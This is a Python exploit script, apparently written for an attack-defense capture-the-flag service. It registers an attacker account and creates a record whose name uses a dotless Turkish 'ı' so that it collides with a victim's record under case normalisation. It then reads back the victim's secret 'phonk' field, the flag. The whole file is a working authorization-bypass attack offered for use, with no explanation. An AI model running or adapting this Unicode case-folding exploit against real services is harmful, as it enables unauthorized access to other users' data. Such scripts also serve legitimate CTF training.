#!/usr/bin/env python3
import uuid
import urllib.parse
import base69
import requests
import sys

IP = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = 41114
PUBLIC_FLAG_ID = sys.argv[2] if len(sys.argv) > 2 else ""


def main():
    api_url = f"http://{IP}:{PORT}/"
    hacker_username = f'hac3r{uuid.uuid4()}'
    hacker_password = f'hah-{uuid.uuid4()}'
    requests.post(api_url + 'auth/register/',json={
        'username': hacker_username,
        'password': hacker_password
    })
    hacker_token = requests.post(api_url + 'auth/login/',json={
        'username': hacker_username,
        'password': hacker_password
    }).json()['accessToken']
    hacker_id = requests.get(f'{api_url}users/{urllib.parse.quote_plus(hacker_username)}/' ,headers={
        'x-access-token': hacker_token
    }).json()['id']
    name = PUBLIC_FLAG_ID.upper().lower()
    if 'i' in name:
        name = name.replace('i', 'ı')
    else:
        raise RuntimeError('No "i" symbol in FLAG_ID')
    resp = requests.put(f'{api_url}udar/', headers={'x-access-token': hacker_token}, json={
        'name': base69.encodeString(name),
        'trustedRusi': [hacker_id],
        'phonk': 'ULTRA HARD 23',
        'map': 1,
        'description': 'oldone'
    })
    if resp.status_code != 201:
        print('error create')
        print(resp.status_code)
        print(resp.json())
        return
    result = requests.get(f'{api_url}udar/{PUBLIC_FLAG_ID.upper()}/',
                          headers={'x-access-token': hacker_token}).json()
    print(result['phonk'])
    return result['phonk']


if __name__ == '__main__':
    main()

